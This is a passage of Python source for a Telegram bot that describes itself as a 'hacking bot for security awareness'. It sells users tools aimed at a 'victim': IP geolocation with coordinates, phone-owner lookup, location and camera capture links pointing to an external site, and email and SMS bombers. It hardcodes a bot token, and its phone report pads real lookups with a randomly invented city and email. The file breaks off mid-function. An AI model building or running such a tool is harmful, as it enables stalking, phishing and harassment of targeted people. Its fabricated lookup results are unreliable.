hereimport telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, BotCommand
import sqlite3
import time
import requests
import phonenumbers
from phonenumbers import geocoder, carrier
import random
import threading

try:
    import truecallerpy
except:
    pass

# ⚠️⚠️ إعداداتك هنا ⚠️⚠️
BOT_TOKEN = '8631883105:AAEh_pa8GZUITtttMSVEryWLaTcgxwbLBrc'
ADMIN_ID = 8564695453
WEBSITE_URL = "https://aljoker218.github.io/Alsafel-"

bot = telebot.TeleBot(BOT_TOKEN)

# --- إعداد أوامر البوت (الكيبورد) ---
try:
    bot.set_my_commands([
        BotCommand("start", "بدء البوت"),
        BotCommand("language", "تغيير اللغة"),
        BotCommand("admin", "لوحة التحكم")
    ])
except: pass

# --- إعداد قاعدة البيانات ---
def get_db():
    conn = sqlite3.connect('bot_database.db', check_same_thread=False, timeout=20)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    try:
        cursor = conn.cursor()
        cursor.execute('''CREATE TABLE IF NOT EXISTS users (
                            user_id INTEGER PRIMARY KEY, username TEXT, first_name TEXT,
                            points INTEGER DEFAULT 0, invited_by INTEGER DEFAULT NULL)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)''')
        cursor.execute('''CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY)''')

        # ✅ جدول جديد لقنوات الاشتراك المتعددة (تيليجرام/يوتيوب/واتساب/تيك توك/بوت)
        cursor.execute('''CREATE TABLE IF NOT EXISTS required_channels (
                            id INTEGER PRIMARY KEY AUTOINCREMENT,
                            channel_type TEXT NOT NULL,
                            channel_id   TEXT NOT NULL,
                            title        TEXT NOT NULL,
                            sort_order   INTEGER DEFAULT 0,
                            added_at     TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')

        cursor.execute("PRAGMA table_info(users)")
        columns = [column[1] for column in cursor.fetchall()]
        if 'lang' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN lang TEXT DEFAULT 'ar'")
        if 'is_banned' not in columns:
            cursor.execute("ALTER TABLE users ADD COLUMN is_banned INTEGER DEFAULT 0")

        defaults = {
            'base_url': WEBSITE_URL, 'forced_channel': '',
            'price_basic': '20', 'price_ip': '20', 'price_phone': '20',
            'price_loc': '20', 'price_cam': '20', 'price_email': '20',
            'price_sms': '20', 'price_studio': '20',
            'name_basic': '🔗 معلومات عامة', 'name_ip': '🔴 فحص IP',
            'name_phone': '🔍 تتبع الرقم', 'name_loc': '📍 الموقع الدقيق',
            'name_cam': '📸 الكاميرا', 'name_email': '💣 قاذف إيميلات',
            'name_sms': '📨 قنبلة رسائل', 'name_studio': '📱 الاستوديو',
            'name_account': '👤 معلومات حسابك', 'name_invite': '🚀 دعوة صديق',
            'name_points': '💎 رصيدي', 'name_support': '💬 التواصل مع الدعم'
        }
        for k, v in defaults.items():
            cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)", (k, v))

        # ✅ ترحيل القناة القديمة (forced_channel) إلى الجدول الجديد مرة واحدة
        cursor.execute("SELECT value FROM settings WHERE key='forced_channel'")
        old = cursor.fetchone()
        if old and old[0] and old[0].strip():
            cursor.execute("SELECT COUNT(*) FROM required_channels")
            if cursor.fetchone()[0] == 0:
                ch = old[0].strip()
                if not ch.startswith('@') and not ch.startswith('-100'):
                    ch = '@' + ch
                cursor.execute(
                    "INSERT OR IGNORE INTO required_channels (channel_type, channel_id, title) VALUES (?,?,?)",
                    ('telegram', ch, ch)
                )

        conn.commit()
    finally:
        conn.close()

init_db()

# --- دوال مساعدة ---
def get_setting(key):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key=?", (key,))
    res = cursor.fetchone(); conn.close()
    return res[0] if res else None

def set_setting(key, value):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, value))
    conn.commit(); conn.close()

def get_user(user_id):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE user_id=?", (user_id,))
    res = cursor.fetchone(); conn.close()
    return res

def update_user_info(user_id, username, first_name):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    cursor.execute("UPDATE users SET username=?, first_name=? WHERE user_id=?", (username, first_name, user_id))
    conn.commit(); conn.close()

def add_points(user_id, amount):
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
    cursor.execute("UPDATE users SET points = points + ? WHERE user_id = ?", (amount, user_id))
    conn.commit(); conn.close()

def is_admin(user_id):
    if user_id == ADMIN_ID: return True
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM admins WHERE user_id=?", (user_id,))
    res = cursor.fetchone(); conn.close()
    return bool(res)

def get_all_users():
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users WHERE is_banned=0")
    res = [row[0] for row in cursor.fetchall()]
    conn.close(); return res

# ✅ دوال قنوات الاشتراك (جديدة)
TYPE_EMOJI = {'telegram': '📡', 'youtube': '▶️', 'whatsapp': '💬', 'tiktok': '🎵', 'bot': '🤖'}
TYPE_ORDER = ['telegram', 'youtube', 'whatsapp', 'tiktok', 'bot']

def get_channels():
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("""SELECT * FROM required_channels
        ORDER BY CASE channel_type
            WHEN 'telegram' THEN 1 WHEN 'youtube' THEN 2
            WHEN 'whatsapp' THEN 3 WHEN 'tiktok' THEN 4
            WHEN 'bot' THEN 5 ELSE 6 END,
            sort_order, added_at""")
    rows = cursor.fetchall(); conn.close(); return rows

def get_channel_url(ch):
    cid = ch['channel_id']
    t = ch['channel_type']
    if t == 'telegram':
        if cid.startswith('@'): return f"https://t.me/{cid[1:]}"
        if cid.startswith('-100'): return None
        return f"https://t.me/{cid}"
    if t == 'bot':
        return f"https://t.me/{cid.replace('@','')}"
    return cid

def is_user_subscribed(user_id, channel_id):
    try:
        member = bot.get_chat_member(channel_id, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        err = str(e).lower()
        # لو المستخدم مش موجود أصلاً → مش مشترك
        if 'user not found' in err or 'user_not_participant' in err:
            return False
        # البوت مش أدمن أو القناة غلط → نتخطى التحقق عشان منقفلش البوت
        print(f"[Skip check {channel_id}]: {e}")
        return True

def build_subscription_keyboard(user_id):
    markup = InlineKeyboardMarkup(row_width=1)
    for ch in get_channels():
        url = get_channel_url(ch)
        if not url: continue
        emoji = TYPE_EMOJI.get(ch['channel_type'], '🔗')
        title = (ch['title'] or '')[:40] or ch['channel_id']
        markup.add(InlineKeyboardButton(f"{emoji} {title}", url=url))
    markup.add(InlineKeyboardButton(get_text(user_id, 'btn_check_sub'), callback_data="check_sub"))
    return markup

# ✅ استبدال check_subscription — تتحقق من كل قنوات تيليجرام فقط
def check_subscription(user_id):
    tg_channels = [c for c in get_channels() if c['channel_type'] == 'telegram']
    if not tg_channels:
        return True
    for ch in tg_channels:
        if not is_user_subscribed(user_id, ch['channel_id']):
            return False
    return True

# --- الترجمة ---
def get_text(user_id, key):
    user = get_user(user_id)
    lang = user['lang'] if user and 'lang' in user.keys() else 'ar'

    texts = {
        'ar': {
            'welcome': "<pre>┌──────────────────────────┐\n      𓅗EL JOKER EL SAFEL𓅗\n└──────────────────────────┘</pre>\n\nمرحباً بك يا <b>{}</b> . . <b>𓅓ٱﭑݪٚســོ‌ــــٱفل𓅓</b> في بوت <b>EL JOKER EL SAFEL</b>، بوت اختراق للتوعية الأمنية. ويدعم التجربه\n\n👨‍💻 @Aljoker_AlsafelL\n\n👇 اختر من الأزرار بالأسفل:",
            'account_info': "مرحباً {} (@{}):\n🆔 معرّف المستخدم: <code>{}</code>\n👥 الدعوات: {}\n💳 الرصيد: {}\n🔗 رابط الدعوة: <code>{}</code>\n\n⚡ احصل على المزيد من الرصيد المجاني \nعن طريق دعوة أصدقائك 🚀\n\n👨‍💻 @Aljoker_AlsafelL",

            'btn_basic': get_setting('name_basic') or 'معلومات أساسية',
            'btn_ip': get_setting('name_ip') or 'عنوان IP',
            'btn_phone': get_setting('name_phone') or 'رقم الهاتف',
            'btn_loc': get_setting('name_loc') or 'الموقع',
            'btn_cam': get_setting('name_cam') or 'الكاميرا',
            'btn_email': get_setting('name_email') or 'الإيميل',
            'btn_sms': get_setting('name_sms') or 'الرسائل',
            'btn_studio': get_setting('name_studio') or 'ستوديو',
            'btn_account': get_setting('name_account') or 'الحساب',
            'btn_invite': get_setting('name_invite') or 'دعوة صديق',
            'btn_points': get_setting('name_points') or 'النقاط',
            'btn_support': get_setting('name_support') or 'الدعم',

            'msg_ask_ip': "📡 **أرسل عنوان الـ IP المستهدف الآن:**", 'msg_ask_phone': "📱 **أرسل رقم الهاتف المستهدف (مع كود الدولة):**",
            'msg_ask_email': "💣 **أرسل إيميل الضحية لبدء قنبلة الإيميلات:**", 'msg_ask_sms': "📨 **أرسل رقم الضحية لبدء قنبلة الرسائل:**",
            'msg_ask_studio': "📱 **أرسل آي دي الجهاز أو رقم الهاتف:**",
            'msg_running': "✅ **البوت يعمل الآن!**", 'msg_banned': "🚫 عذراً، لقد تم حظرك.",
            'msg_link_ready': "✅ **{}** جاهز:\n<code>{}</code>", 'btn_open': "🌐 فتح {}", 'msg_points': "💎 رصيدك: {} نقطة.",
            'msg_insufficient': "❌ **عذراً، رصيدك غير كافي!**\n\n💎 سعر الميزة: {} نقطة.\n💰 رصيدك: {} نقطة.\n⚠️ بحاجة إلى **{}** نقطة إضافية.",
            'btn_invite_short': "🚀 دعوة صديق", 'btn_support_short': "💬 التواصل مع الدعم",
            'msg_must_sub': "⚠️ عذراً، يجب عليك الاشتراك في قنواتنا أولاً لاستخدام البوت.",
            'btn_sub': "📢 اشترك في القناة", 'btn_check_sub': "✅ تحقق من الاشتراك",

            'admin_panel': "👑 **لوحة تحكم المطور**\nاختر من الأزرار:",
            'admin_preview': "👁️ معاينة", 'admin_users': "👥 المستخدمين", 'admin_broadcast': "📨 رسالة جماعية",
            'admin_points': "💎 إدارة النقط", 'admin_prices': "⚙️ الأسعار", 'admin_link': "🔗 تغيير اللينك",
            'admin_channel': "📢 الاشتراك الإجباري", 'admin_del_channel': "❌ إلغاء القناة",
            'admin_edit_names': "✏️ تعديل أسماء الأزرار", 'admin_ban': "🚫 حظر", 'admin_unban': "✅ إلغاء الحظر", 'admin_add': "👑 إضافة أدمن",
            'msg_ask_user': "أرسل ID المستخدم:", 'msg_user_not_found': "❌ المستخدم غير موجود.",
            'msg_ask_broadcast': "📝 أرسل الرسالة للجميع:", 'msg_broadcast_sending': "⏳ جاري الإرسال إلى {}...", 'msg_broadcast_done': "✅ تم!\n🟢 نجح: {}",
            'msg_ask_link': "أرسل اللينك الأساسي الجديد:", 'msg_link_updated': "✅ تم التعديل",
            'msg_ask_price': "أرسل السعر الجديد لـ ({}):", 'msg_price_updated': "✅ تم التعديل", 'msg_price_error': "❌ أرسل أرقام فقط.",
            'msg_ask_ban': "أرسل ID المستخدم للحظر:", 'msg_ban_done': "✅ تم حظر {}.",
            'msg_ask_unban': "✅ لا يوجد محظورين.", 'msg_unban_done': "✅ تم فك الحظر.",
            'msg_ask_admin': "أرسل ID الشخص ليصبح أدمن:", 'msg_admin_done': "✅ تم إضافة {} كأدمن.", 'msg_admin_welcome': "👑 مبروك! تم تعيينك كأدمن.",
            'msg_ask_channel': "أرسل يوزرنيم القناة (مثال: @MyChannel):",
            'msg_channel_saved': "✅ تم تعيين القناة: {}", 'msg_channel_removed': "✅ تم إلغاء الاشتراك الإجباري.",
            'msg_edit_names': "اختر الزرار اللي عايز تعدل اسمه:", 'msg_send_new_name': "أرسل الاسم الجديد لـ ({}):", 'msg_name_updated': "✅ تم تعديل الاسم بنجاح!",
            'msg_points_select': "👤 المستخدم: {}\nاختر العملية:", 'msg_points_added': "🎁 مبروك! تم إضافة {} نقطة لرصيدك.",
            'msg_points_now': "✅ تم التعديل. رصيده الآن: {}",

            # ✅ نصوص قنوات الاشتراك الجديدة
            'admin_channels_menu': "📢 إدارة قنوات الاشتراك:\nاختر نوع القناة:",
            'admin_add_tg': "➕ قناة تيليجرام",
            'admin_add_yt': "➕ قناة يوتيوب",
            'admin_add_wa': "➕ قناة واتساب",
            'admin_add_tt': "➕ قناة تيك توك",
            'admin_add_bot': "➕ بوت",
            'msg_ask_ch_link': "📥 أرسل بيانات القناة:\n• تيليجرام: @username أو الرابط\n• يوتيوب/واتساب/تيك توك: الرابط الكامل\n• بوت: @username",
            'msg_ch_added': "✅ تم إضافة القناة بنجاح.",
            'msg_no_channels': "📭 لا توجد قنوات مضافة حاليًا.",
            'msg_del_list': "🗑 اختر القناة لحذفها:",
            'msg_deleted': "🗑 تم حذف القناة.",
            'msg_ch_error': "❌ تعذر إضافة القناة. تحقق من الصيغة وحاول مجددًا.",
            'btn_back': "🔙 رجوع",
        },
        'en': {
            'welcome': "<pre>┌──────────────────────────┐\n      𓅗EL JOKER EL SAFEL𓅗\n└──────────────────────────┘</pre>\n\nWelcome <b>{}</b> . . <b>𓅓ٱﭑݪٚســོ‌ــــٱفل𓅓</b> to <b>EL JOKER EL SAFEL</b> bot.\n\n👨‍💻 @Aljoker_AlsafelL\n\n👇 Choose:",
            'account_info': "Welcome {} (@{}):\n🆔 ID: <code>{}</code>\n👥 Invites: {}\n💳 Points: {}\n🔗 Link: <code>{}</code>\n\n👨‍💻 @Aljoker_AlsafelL",

            'btn_basic': "Basic Info", 'btn_ip': "IP Address",
            'btn_phone': "Phone Number", 'btn_loc': "Location",
            'btn_cam': "Camera", 'btn_email': "Email",
            'btn_sms': "SMS", 'btn_studio': "Studio",
            'btn_account': "Account", 'btn_invite': "Invite",
            'btn_points': "Points", 'btn_support': "Support",

            'msg_ask_ip': "📡 **Send Target IP:**", 'msg_ask_phone': "📱 **Send Target Phone:**",
            'msg_ask_email': "💣 **Send Target Email:**", 'msg_ask_sms': "📨 **Send Target Phone:**",
            'msg_ask_studio': "📱 **Send Device ID or Phone:**",
            'msg_running': "✅ **Bot is running!**", 'msg_banned': "🚫 You are banned.",
            'msg_link_ready': "✅ **{}** ready:\n<code>{}</code>", 'btn_open': "🌐 Open {}", 'msg_points': "💎 Points: {}.",
            'msg_insufficient': "❌ **Insufficient points!**\n\n💎 Price: {}.\n💰 Yours: {}.\n⚠️ Need **{}** more.",
            'btn_invite_short': "🚀 Invite Friend", 'btn_support_short': "💬 Contact Support",
            'msg_must_sub': "⚠️ You must subscribe to our channels first.",
            'btn_sub': "📢 Subscribe", 'btn_check_sub': "✅ Check Subscription",

            'admin_panel': "👑 **Admin Panel**\nChoose:",
            'admin_preview': "👁️ Preview", 'admin_users': "👥 Users", 'admin_broadcast': "📨 Broadcast",
            'admin_points': "💎 Manage Points", 'admin_prices': "⚙️ Prices", 'admin_link': "🔗 Change Link",
            'admin_channel': "📢 Forced Subscription", 'admin_del_channel': "❌ Remove Channel",
            'admin_edit_names': "✏️ Edit Button Names", 'admin_ban': "🚫 Ban", 'admin_unban': "✅ Unban", 'admin_add': "👑 Add Admin",
            'msg_ask_user': "Send User ID:", 'msg_user_not_found': "❌ User not found.",
            'msg_ask_broadcast': "📝 Send message to all:", 'msg_broadcast_sending': "⏳ Sending to {}...", 'msg_broadcast_done': "✅ Done!\n🟢 Success: {}",
            'msg_ask_link': "Send new main link:", 'msg_link_updated': "✅ Updated",
            'msg_ask_price': "Send new price for ({}):", 'msg_price_updated': "✅ Updated", 'msg_price_error': "❌ Numbers only.",
            'msg_ask_ban': "Send User ID to ban:", 'msg_ban_done': "✅ Banned {}.",
            'msg_ask_unban': "✅ No banned users.", 'msg_unban_done': "✅ Unbanned.",
            'msg_ask_admin': "Send ID to become admin:", 'msg_admin_done': "✅ Added {} as admin.", 'msg_admin_welcome': "👑 Congrats! You are now an admin.",
            'msg_ask_channel': "Send channel username (e.g. @MyChannel):",
            'msg_channel_saved': "✅ Channel set: {}", 'msg_channel_removed': "✅ Forced sub removed.",
            'msg_edit_names': "Choose button to edit:", 'msg_send_new_name': "Send new name for ({}):", 'msg_name_updated': "✅ Name updated!",
            'msg_points_select': "👤 User: {}\nChoose operation:", 'msg_points_added': "🎁 Congrats! {} points added.",
            'msg_points_now': "✅ Updated. Current points: {}",

            'admin_channels_menu': "📢 Manage subscription channels:\nChoose type:",
            'admin_add_tg': "➕ Telegram channel",
            'admin_add_yt': "➕ YouTube channel",
            'admin_add_wa': "➕ WhatsApp channel",
            'admin_add_tt': "➕ TikTok channel",
            'admin_add_bot': "➕ Bot",
            'msg_ask_ch_link': "📥 Send channel data:\n• Telegram: @username or URL\n• YouTube/WhatsApp/TikTok: full URL\n• Bot: @username",
            'msg_ch_added': "✅ Channel added.",
            'msg_no_channels': "📭 No channels added yet.",
            'msg_del_list': "🗑 Select channel to delete:",
            'msg_deleted': "🗑 Channel deleted.",
            'msg_ch_error': "❌ Could not add channel. Check the format.",
            'btn_back': "🔙 Back",
        },
        'hi': {
            'welcome': "<pre>┌──────────────────────────┐\n      𓅗EL JOKER EL SAFEL𓅗\n└──────────────────────────┘</pre>\n\nस्वागत है <b>{}</b> <b>EL JOKER EL SAFEL</b> बॉट में।\n\n👨‍💻 @Aljoker_AlsafelL\n\n👇 चुनें:",
            'account_info': "स्वागत है {} (@{}):\n🆔 आईडी: <code>{}</code>\n👥 आमंत्रण: {}\n💳 अंक: {}\n🔗 लिंक: <code>{}</code>\n\n👨‍💻 @Aljoker_AlsafelL",

            'btn_basic': "मूल जानकारी", 'btn_ip': "आईपी पता",
            'btn_phone': "फोन नंबर", 'btn_loc': "स्थान",
            'btn_cam': "कैमरा", 'btn_email': "ईमेल",
            'btn_sms': "संदेश", 'btn_studio': "स्टूडियो",
            'btn_account': "खाता", 'btn_invite': "आमंत्रण",
            'btn_points': "अंक", 'btn_support': "सहायता",

            'msg_ask_ip': "📡 **लक्ष्य आईपी भेजें:**", 'msg_ask_phone': "📱 **लक्ष्य फोन भेजें:**",
            'msg_ask_email': "💣 **लक्ष्य ईमेल भेजें:**", 'msg_ask_sms': "📨 **लक्ष्य फोन भेजें:**",
            'msg_ask_studio': "📱 **डिवाइस आईडी या फोन भेजें:**",
            'msg_running': "✅ **बॉट चल रहा है!**", 'msg_banned': "🚫 आप प्रतिबंधित हैं।",
            'msg_link_ready': "✅ **{}** तैयार:\n<code>{}</code>", 'btn_open': "🌐 खोलें {}", 'msg_points': "💎 अंक: {}.",
            'msg_insufficient': "❌ **अपर्याप्त अंक!**\n\n💎 मूल्य: {}.\n💰 आपके: {}.\n⚠️ **{}** और चाहिए।",
            'btn_invite_short': "🚀 मित्र को आमंत्रित करें", 'btn_support_short': "💬 सहायता से संपर्क करें",
            'msg_must_sub': "⚠️ आपको पहले हमारे चैनल्स की सदस्यता लेनी होगी।",
            'btn_sub': "📢 सदस्यता लें", 'btn_check_sub': "✅ सदस्यता जांचें",

            'admin_panel': "👑 **एडमिन पैनल**\nचुनें:",
            'admin_preview': "👁️ पूर्वावलोकन", 'admin_users': "👥 उपयोगकर्ता", 'admin_broadcast': "📨 प्रसारण",
            'admin_points': "💎 अंक प्रबंधित करें", 'admin_prices': "⚙️ कीमतें", 'admin_link': "🔗 लिंक बदलें",
            'admin_channel': "📢 अनिवार्य सदस्यता", 'admin_del_channel': "❌ चैनल हटाएं",
            'admin_edit_names': "✏️ बटन नाम संपादित करें", 'admin_ban': "🚫 प्रतिबंधित करें", 'admin_unban': "✅ प्रतिबंध हटाएं", 'admin_add': "👑 एडमिन जोड़ें",
            'msg_ask_user': "उपयोगकर्ता आईडी भेजें:", 'msg_user_not_found': "❌ उपयोगकर्ता नहीं मिला।",
            'msg_ask_broadcast': "📝 सभी को संदेश भेजें:", 'msg_broadcast_sending': "⏳ {} को भेजा जा रहा है...", 'msg_broadcast_done': "✅ पूरा हुआ!\n🟢 सफल: {}",
            'msg_ask_link': "नया मुख्य लिंक भेजें:", 'msg_link_updated': "✅ अपडेट किया गया",
            'msg_ask_price': "({}) के लिए नई कीमत भेजें:", 'msg_price_updated': "✅ अपडेट किया गया", 'msg_price_error': "❌ केवल संख्याएं।",
            'msg_ask_ban': "प्रतिबंधित करने के लिए आईडी भेजें:", 'msg_ban_done': "✅ {} को प्रतिबंधित किया गया।",
            'msg_ask_unban': "✅ कोई प्रतिबंधित उपयोगकर्ता नहीं।", 'msg_unban_done': "✅ प्रतिबंध हटाया गया।",
            'msg_ask_admin': "एडमिन बनाने के लिए आईडी भेजें:", 'msg_admin_done': "✅ {} को एडमिन बनाया गया।", 'msg_admin_welcome': "👑 बधाई हो! आप अब एडमिन हैं।",
            'msg_ask_channel': "चैनल यूजरनेम भेजें (उदा. @MyChannel):",
            'msg_channel_saved': "✅ चैनल सेट: {}", 'msg_channel_removed': "✅ अनिवार्य सदस्यता हटाई गई।",
            'msg_edit_names': "संपादित करने के लिए बटन चुनें:", 'msg_send_new_name': "({}) के लिए नया नाम भेजें:", 'msg_name_updated': "✅ नाम अपडेट हो गया!",
            'msg_points_select': "👤 उपयोगकर्ता: {}\nकार्रवाई चुनें:", 'msg_points_added': "🎁 बधाई! {} अंक जोड़े गए।",
            'msg_points_now': "✅ अपडेट किया गया। वर्तमान अंक: {}",

            'admin_channels_menu': "📢 सदस्यता चैनल प्रबंधित करें:\nप्रकार चुनें:",
            'admin_add_tg': "➕ टेलीग्राम चैनल",
            'admin_add_yt': "➕ यूट्यूब चैनल",
            'admin_add_wa': "➕ व्हाट्सएप चैनल",
            'admin_add_tt': "➕ टिकटॉक चैनल",
            'admin_add_bot': "➕ बॉट",
            'msg_ask_ch_link': "📥 चैनल डेटा भेजें:\n• टेलीग्राम: @username या URL\n• यूट्यूब/व्हाट्सएप/टिकटॉक: पूरा URL\n• बॉट: @username",
            'msg_ch_added': "✅ चैनल जोड़ा गया।",
            'msg_no_channels': "📭 अभी कोई चैनल नहीं जोड़ा गया।",
            'msg_del_list': "🗑 हटाने के लिए चैनल चुनें:",
            'msg_deleted': "🗑 चैनल हटा दिया गया।",
            'msg_ch_error': "❌ चैनल जोड़ा नहीं जा सका।",
            'btn_back': "🔙 वापस",
        }
    }
    return texts.get(lang, texts['ar']).get(key, key)

# --- إشعار التشغيل ---
def send_startup_message():
    users = get_all_users()
    for uid in users:
        try:
            bot.send_message(uid, get_text(uid, 'msg_running'), parse_mode='Markdown')
            time.sleep(0.05)
        except: pass

# --- شريط التحميل ---
def run_progress_bar(chat_id, title, steps, final_action):
    msg = bot.send_message(chat_id, f"```\n[░░░░░░░░░░] 0%\n> {title}...\n```", parse_mode='Markdown')
    time.sleep(0.5)
    for pct, text in steps:
        bar = "█" * (pct // 10) + "░" * (10 - (pct // 10))
        try: bot.edit_message_text(f"```\n[{bar}] {pct}%\n< {text}\n```", chat_id, msg.message_id, parse_mode='Markdown')
        except: pass
        time.sleep(0.8)
    final_action(chat_id)

# --- التحقق من الرصيد ---
def check_and_deduct_points(user_id, price_key):
    cost = int(get_setting(price_key) or 20)
    user = get_user(user_id)
    points = user['points'] if user else 0
    if points >= cost:
        add_points(user_id, -cost)
        return True, cost, points
    else:
        return False, cost, points

# --- القائمة الرئيسية ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user_id = message.from_user.id
    update_user_info(user_id, message.from_user.username, message.from_user.first_name)

    user = get_user(user_id)
    if user and user['is_banned'] == 1:
        bot.send_message(user_id, get_text(user_id, 'msg_banned'), reply_markup=ReplyKeyboardRemove())
        return

    # ✅ تم استبدال بلوك التحقق القديم ببلوك القنوات المتعددة
    if not check_subscription(user_id):
        bot.send_message(user_id, get_text(user_id, 'msg_must_sub'),
                         reply_markup=build_subscription_keyboard(user_id))
        return

    if is_admin(user_id):
        show_admin_panel(message)
        return

    show_user_panel(message.chat.id, message.from_user.first_name, user_id)

def show_user_panel(chat_id, user_name, user_id):
    text = get_text(user_id, 'welcome').format(user_name)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton(get_text(user_id, 'btn_basic'), callback_data="get_basic"),
        InlineKeyboardButton(get_text(user_id, 'btn_ip'), callback_data="ip_scan"),
        InlineKeyboardButton(get_text(user_id, 'btn_phone'), callback_data="phone_scan"),
        InlineKeyboardButton(get_text(user_id, 'btn_loc'), callback_data="get_loc"),
        InlineKeyboardButton(get_text(user_id, 'btn_cam'), callback_data="get_cam"),
        InlineKeyboardButton(get_text(user_id, 'btn_email'), callback_data="email_bomb"),
        InlineKeyboardButton(get_text(user_id, 'btn_sms'), callback_data="sms_bomb"),
        InlineKeyboardButton(get_text(user_id, 'btn_studio'), callback_data="studio_fake"),
        InlineKeyboardButton(get_text(user_id, 'btn_account'), callback_data="account_info"),
        InlineKeyboardButton(get_text(user_id, 'btn_invite'), callback_data="invite"),
        InlineKeyboardButton(get_text(user_id, 'btn_points'), callback_data="my_points")
    )
    markup.add(InlineKeyboardButton(get_text(user_id, 'btn_support'), url=f"tg://user?id={ADMIN_ID}"))
    markup.add(InlineKeyboardButton("🌍 تغيير اللغة", callback_data="change_lang"))
    bot.send_message(chat_id, text, parse_mode='HTML', reply_markup=markup, disable_web_page_preview=True)

# --- أوامر اللغة ---
@bot.message_handler(commands=['language'])
def language_cmd(message):
    lang_menu(message)

@bot.callback_query_handler(func=lambda call: call.data == "change_lang")
def lang_menu(call):
    markup = InlineKeyboardMarkup(row_width=3)
    markup.add(
        InlineKeyboardButton("🇪🇬 العربية", callback_data="set_lang_ar"),
        InlineKeyboardButton("🇬🇧 English", callback_data="set_lang_en"),
        InlineKeyboardButton("🇮🇳 हिन्दी", callback_data="set_lang_hi")
    )
    if hasattr(call, 'message'):
        bot.edit_message_text("🌍 Choose Language:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
    else:
        bot.send_message(call.chat.id, "🌍 Choose Language:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('set_lang_'))
def set_lang(call):
    lang = call.data.split('_')[2]
    conn = get_db(); cursor = conn.cursor()
    cursor.execute("UPDATE users SET lang=? WHERE user_id=?", (lang, call.from_user.id))
    conn.commit(); conn.close()
    bot.answer_callback_query(call.id, "✅ Language updated!")
    show_user_panel(call.message.chat.id, call.from_user.first_name, call.from_user.id)

@bot.callback_query_handler(func=lambda call: call.data == "check_sub")
def check_sub_callback(call):
    if check_subscription(call.from_user.id):
        bot.delete_message(call.message.chat.id, call.message.message_id)
        show_user_panel(call.message.chat.id, call.from_user.first_name, call.from_user.id)
    else:
        bot.answer_callback_query(call.id, "❌ You are not subscribed yet!", show_alert=True)

# --- محرك الفحص (IP) ---
@bot.callback_query_handler(func=lambda call: call.data == "ip_scan")
def ask_ip(call):
    success, cost, current = check_and_deduct_points(call.from_user.id, 'price_ip')
    if not success:
        show_insufficient_points(call, cost, current)
        return
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_ip'), parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_ip_scan)

def process_ip_scan(message):
    ip = message.text.strip()
    chat_id = message.chat.id
    steps = [(10, "Starting..."), (30, "ISP..."), (50, "Analyzing..."), (80, "Coords..."), (100, "Done ✅")]
    def final_action(cid):
        try:
            res = requests.get(f'http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,lat,lon,timezone,mobile').json()
            if res['status'] == 'success':
                lat, lon = res['lat'], res['lon']
                report = (
                    f"```\n[-] 🎯 Target: {ip}\n[-] 🛰️ ISP: {res['isp']}\n"
                    f"[-] 🏢 Org: {res['org']}\n[-] 📍 Country: {res['country']}\n"
                    f"[-] 🏙️ City: {res['regionName']} - {res['city']}\n"
                    f"[-] 📍 Lat: {lat} | Lon: {lon}\n```"
                )
                bot.send_message(cid, report, parse_mode='Markdown')
                bot.send_location(cid, lat, lon)
            else:
                bot.send_message(cid, "❌ Failed.")
        except:
            bot.send_message(cid, "❌ Error.")
    run_progress_bar(chat_id, "IP Scan", steps, final_action)

# --- محرك الفحص (الرقم) ---
@bot.callback_query_handler(func=lambda call: call.data == "phone_scan")
def ask_phone(call):
    success, cost, current = check_and_deduct_points(call.from_user.id, 'price_phone')
    if not success:
        show_insufficient_points(call, cost, current)
        return
    msg = bot.send_message(call.message.chat.id, get_text(call.from_user.id, 'msg_ask_phone'), parse_mode='Markdown')
    bot.register_next_step_handler(msg, process_phone_scan)

def process_phone_scan(message):
    phone = message.text.strip()
    chat_id = message.chat.id
    steps = [(10, "Starting..."), (30, "Truecaller..."), (50, "OSINT..."), (80, "Report..."), (100, "Done ✅")]
    def final_action(cid):
        try:
            parsed = phonenumbers.parse(phone, None)
            region = geocoder.description_for_number(parsed, "ar")
            carrier_name = carrier.name_for_number(parsed, "ar")
            country_code = parsed.country_code
        except:
            region, carrier_name, country_code = "Unknown", "Unknown", 0
        caller_name = "Unknown"
        try:
            if 'truecallerpy' in globals():
                result = truecallerpy.search(phone)
                if result and 'name' in result: caller_name = result['name']
        except: pass
        fake_cities = {20: ["Cairo", "Giza"], 218: ["Tripoli", "Benghazi"], 966: ["Riyadh"]}
        fake_city = random.choice(fake_cities.get(country_code, ["Capital"]))
        fake_email = f"user_{random.randint(100,999)}@gmail.com"
        report = (
            f"```\n[-] 📱 Target: {phone}\n[-] 👤 Name: {caller_name}\n"
            f"[-] 🌍 Country: {region}\n[-] 🏙️ City (Guess): {fake_city}\n"
            f"[-] 🛰️ Carrier: {carrier_name}\n[-] 📧 Email: {fake_email}\n```"
        )
        markup = InlineKeyboardMarkup(row_width=2)
        markup.add(
